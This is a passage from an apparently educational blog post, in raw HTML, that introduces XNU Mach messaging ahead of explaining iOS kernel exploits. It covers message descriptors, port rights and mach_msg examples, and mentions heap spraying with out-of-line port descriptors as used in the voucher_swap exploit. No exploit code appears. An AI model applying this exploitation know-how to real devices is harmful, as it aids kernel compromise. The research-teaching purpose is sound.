    &lt;span class=&quot;mi&quot;&gt;411&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgh_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;412&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;mach_msg_id_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;414&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The &lt;strong&gt;mach_msg_type_descriptor_t&lt;/strong&gt; field specifies what type of descriptor it is, and the other fields contains the corresponding data. The following types of descriptors are present:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     * In a complex mach message, the mach_msg_header_t is followed by 
     * a descriptor count, then an array of that number of descriptors 
     * (mach_msg_*_descriptor_t). The type field of mach_msg_type_descriptor_t
     * (which any descriptor can be cast to) indicates the flavor of the
     * descriptor.
     *
     * Note that in LP64, the various types of descriptors are no longer all
     * the same size as mach_msg_descriptor_t, so the array cannot be indexed 
     * as expected.
     */&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_type_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;cp&quot;&gt;#define MACH_MSG_PORT_DESCRIPTOR 		0
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#define MACH_MSG_OOL_DESCRIPTOR  		1
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#define MACH_MSG_OOL_PORTS_DESCRIPTOR 		2
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR  	3
&lt;/span&gt;
    &lt;span class=&quot;cp&quot;&gt;#pragma pack(4)
&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;pad1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;pad2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;pad3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_type_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_type_descriptor_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/strong&gt;: Sending a port in a message&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_OOL_DESCRIPTOR&lt;/strong&gt;: Sending OOL data in a message&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/strong&gt;: Sending OOL ports array in a message&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_OOL_VOLATILE_DESCRIPTOR&lt;/strong&gt;: Sending volatile data in a message&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The OOL (Out-of-line) Ports descriptor has been used extensively in spraying the heap with user-controlled data. Whenever &lt;strong&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/strong&gt; is used, it allocates (kalloc) an array in the kernel heap with all the port pointers. This technique was used in the voucher_swap exploit and will be discussed in Part 2 of this series.&lt;/p&gt;

&lt;p&gt;Ports are represented by &lt;strong&gt;mach_port_t&lt;/strong&gt; or &lt;strong&gt;mach_port_name_t&lt;/strong&gt; in userland, but not in the kenrel, and this is why it is important to understand the difference between them when used in exploits. &lt;strong&gt;mach_port_name_t&lt;/strong&gt; represents the local namespace identity but without associating any port rights, and it is essentially meaningless outside of the task’s namespace. However, whenever a process receives a &lt;strong&gt;mach_port_t&lt;/strong&gt; from the kernel, it maps the associated port rights to the receiver, whereas in case of &lt;strong&gt;mach_port_name_t&lt;/strong&gt; this is not the case. &lt;strong&gt;mach_port_t&lt;/strong&gt; will usually always have at least one right, which could be &lt;strong&gt;**RECEIVE&lt;/strong&gt;, &lt;strong&gt;SEND&lt;/strong&gt; or SEND_ONCE&lt;strong&gt;. This is the reason when we are referring to the kernel task port in exploits; we use mach_port_t because it does associate the port rights with the object. Obtaining a handle to **mach_port_t&lt;/strong&gt; automatically creates the associated send rights in the caller’s namespace.&lt;/p&gt;

&lt;p&gt;In order to send or receive a message, the &lt;strong&gt;mach_msg&lt;/strong&gt; and &lt;strong&gt;mach_msg_overwrite&lt;/strong&gt; APIs can be used as defined in &lt;strong&gt;osfmk/mach/message.h&lt;/strong&gt;. Let’s have a look at some code samples to get a better understanding. The following code snippet shows the creation of a mach port using the &lt;strong&gt;mach_port_allocate&lt;/strong&gt; API and getting a receive right to that port.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;//Initialize a Port&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//Allocate the port and get a receive right&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_allocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_RIGHT_RECEIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to Allocate a port &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The message can then be sent using the &lt;strong&gt;mach_msg&lt;/strong&gt; Mach trap.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello World !&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*Destination Port*/&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* The header */&lt;/span&gt;
    	    	  &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Flags */&lt;/span&gt;
    		      &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* Send size */&lt;/span&gt;
    		      &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* Max receive Size */&lt;/span&gt;
    		      &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;				&lt;span class=&quot;cm&quot;&gt;/* Receive port */&lt;/span&gt;
    		      &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* No timeout */&lt;/span&gt;
    		      &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* No notification */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And can be received with &lt;strong&gt;mach_msg&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;receive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_allocate&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
           		      	    &lt;span class=&quot;n&quot;&gt;MACH_PORT_RIGHT_RECEIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* The header */&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Flags */&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Send size */&lt;/span&gt;
    	  &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* Max receive size */&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;receive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Receive port */&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* No timeout */&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* No notification */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0959&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    0960:  *	Routine:	mach_msg_overwrite
    0961:  *	Purpose:
    0962:  *		Send and/or receive a message.  If the message operation
    0963:  *		is interrupted, and the user did not request an indication
    0964:  *		of that fact, then restart the appropriate parts of the
    0965:  *		operation silently (trap version does not restart).
    0966:  *
    0967:  *		Distinct send and receive buffers may be specified.  If
    0968:  *		no separate receive buffer is specified, the msg parameter
    0969:  *		will be used for both send and receive operations.
    0970:  *
    0971:  *		In addition to a distinct receive buffer, that buffer may
    0972:  *		already contain scatter control information to direct the
    0973:  *		receiving of the message.
    0974:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0975&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__WATCHOS_PROHIBITED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__TVOS_PROHIBITED&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0976&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;	&lt;span class=&quot;nf&quot;&gt;mach_msg_overwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0977&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0978&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0979&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0980&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0981&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0982&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_timeout_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0983&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0984&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcv_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0985&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0986&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;0987&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifndef&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;KERNEL&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0988&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;0989&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    0990:  *	Routine:	mach_msg
    0991:  *	Purpose:
    0992:  *		Send and/or receive a message.  If the message operation
    0993:  *		is interrupted, and the user did not request an indication
    0994:  *		of that fact, then restart the appropriate parts of the
    0995:  *		operation silently (trap version does not restart).
    0996:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0997&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__WATCHOS_PROHIBITED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__TVOS_PROHIBITED&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0998&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;	&lt;span class=&quot;nf&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0999&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1001&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1002&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1003&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1004&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_msg_timeout_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
